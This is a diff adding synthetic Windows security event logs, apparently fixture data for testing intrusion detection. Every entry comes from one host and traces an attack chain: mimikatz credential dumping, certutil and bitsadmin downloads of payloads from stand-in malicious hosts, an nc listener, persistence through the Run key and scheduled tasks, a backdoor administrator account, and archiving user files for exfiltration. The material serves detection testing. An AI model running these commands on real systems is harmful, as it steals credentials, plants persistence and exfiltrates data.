@@ -1,0 +1,25 @@
+[2026-04-01T08:00:00.000Z] EventID:4625 Computer:DESKTOP-SUSPECT User:admin Message:admin SourceIP:192.168.1.105
+[2026-04-01T08:01:00.000Z] EventID:4625 Computer:DESKTOP-SUSPECT User:admin Message:admin SourceIP:192.168.1.105
+[2026-04-01T08:02:00.000Z] EventID:4625 Computer:DESKTOP-SUSPECT User:admin Message:admin SourceIP:192.168.1.105
+[2026-04-01T08:03:00.000Z] EventID:4624 Computer:DESKTOP-SUSPECT User:admin Message:admin SourceIP:192.168.1.105
+[2026-04-01T08:05:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:cmd.exe /c whoami SourceIP:192.168.1.105
+[2026-04-01T08:06:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:powershell.exe -enc base64_payload SourceIP:192.168.1.105
+[2026-04-01T08:07:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:nc.exe -l -p 4444 SourceIP:192.168.1.105
+[2026-04-01T08:08:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:mimikatz.exe "sekurlsa::logonpasswords" SourceIP:192.168.1.105
+[2026-04-01T08:10:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:certutil.exe -urlcache -f http://malware-server.net/payload.exe SourceIP:192.168.1.105
+[2026-04-01T08:12:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:reg.exe add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v svchost_update /t REG_SZ /d C:\Temp\malware.exe SourceIP:192.168.1.105
+[2026-04-01T08:14:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:schtasks.exe /create /tn "WindowsUpdate" /tr "C:\Temp\malware.exe" /sc minute /mo 5 SourceIP:192.168.1.105
+[2026-04-01T08:15:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:wmic.exe process call create "cmd.exe /c ping -n 1 45.33.32.156" SourceIP:192.168.1.105
+[2026-04-01T08:16:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:bitsadmin.exe /transfer job http://darknet-market.onion/payload C:\Temp\payload.exe SourceIP:192.168.1.105
+[2026-04-01T08:17:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:psexec.exe \\192.168.1.105 -s cmd.exe SourceIP:192.168.1.105
+[2026-04-01T08:18:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:net.exe user hacker P@ssw0rd123! /add SourceIP:192.168.1.105
+[2026-04-01T08:19:00.000Z] EventID:4720 Computer:DESKTOP-SUSPECT User:admin Message:hacker account created SourceIP:192.168.1.105
+[2026-04-01T08:20:00.000Z] EventID:4732 Computer:DESKTOP-SUSPECT User:admin Message:hacker added to Administrators group SourceIP:192.168.1.105
+[2026-04-01T08:22:00.000Z] EventID:4670 Computer:DESKTOP-SUSPECT User:admin Message:Permissions changed on C:\Windows\System32\config\SAM SourceIP:192.168.1.105
+[2026-04-01T08:25:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:tasklist.exe SourceIP:192.168.1.105
+[2026-04-01T08:26:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:net.exe user hacker /domain SourceIP:192.168.1.105
+[2026-04-01T08:28:00.000Z] EventID:4656 Computer:DESKTOP-SUSPECT User:admin Message:Handle to SAM database requested SourceIP:192.168.1.105
+[2026-04-01T08:30:00.000Z] EventID:4663 Computer:DESKTOP-SUSPECT User:admin Message:Attempt to access C:\Users\admin\Desktop\secrets.xlsx SourceIP:192.168.1.105
+[2026-04-01T08:32:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:7z.exe a -p infected.7z C:\Users\admin\Documents SourceIP:192.168.1.105
+[2026-04-01T08:34:00.000Z] EventID:4688 Computer:DESKTOP-SUSPECT User:admin Message:python3 -m http.server 8080 SourceIP:192.168.1.105
+[2026-04-01T08:35:00.000Z] EventID:4698 Computer:DESKTOP-SUSPECT User:admin Message:Scheduled task created: WindowsUpdate (C:\Temp\malware.exe) SourceIP:192.168.1.105
